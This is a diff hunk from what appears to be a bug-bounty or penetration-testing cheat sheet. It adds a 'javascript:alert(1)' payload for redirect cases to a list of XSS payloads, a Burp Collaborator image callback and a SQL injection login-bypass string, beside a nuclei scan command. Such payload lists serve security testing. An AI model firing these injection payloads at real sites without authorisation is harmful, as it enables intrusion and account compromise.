@@ -275,6 +275,7 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 • <Svg One OneLoad=alert(1)>
 • ["');alert('CYBERTIX');//"]@bug.xss 
 • <img src="http://burp-collobrator">
+javascript:alert(1) #Use this once you are redirected to another domain
 • admin' or '1'='1'--
 ```
 #### SQL Injection
